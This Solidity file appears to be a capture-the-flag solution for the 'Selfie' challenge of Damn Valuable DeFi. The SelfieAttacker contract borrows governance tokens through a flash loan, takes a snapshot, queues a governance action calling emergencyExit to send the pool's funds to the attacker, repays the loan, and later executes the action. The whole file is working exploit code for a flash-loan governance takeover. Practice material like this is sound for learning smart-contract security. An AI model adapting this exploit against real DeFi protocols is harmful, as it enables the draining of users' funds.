// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SelfieAttacker {
    address selfiePool;
    address simpleGovernance;
    address token;
    uint256 actionId;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token
    ) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        token = _token;
    }

    function attackOnchainPt1(uint256 amount) external {
        bytes memory data = abi.encodeWithSelector( //transfer to owner
            SelfiePool.emergencyExit.selector,
            msg.sender
        );

        SelfiePool(selfiePool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            token,
            amount,
            data
        );
    }

    function attackOffchainPt1(uint256 amount, bytes calldata data) external {
        SelfiePool(selfiePool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            token,
            amount,
            data
        );
    }

    function attackPt2() external {
        ISimpleGovernance(simpleGovernance).executeAction(actionId);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // call gov
        DamnValuableTokenSnapshot(token).snapshot();
        ISimpleGovernance(simpleGovernance).queueAction(selfiePool, 0, data);
        actionId = ISimpleGovernance(simpleGovernance).getActionCounter() - 1;
        // send back token
        DamnValuableTokenSnapshot(token).approve(msg.sender, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
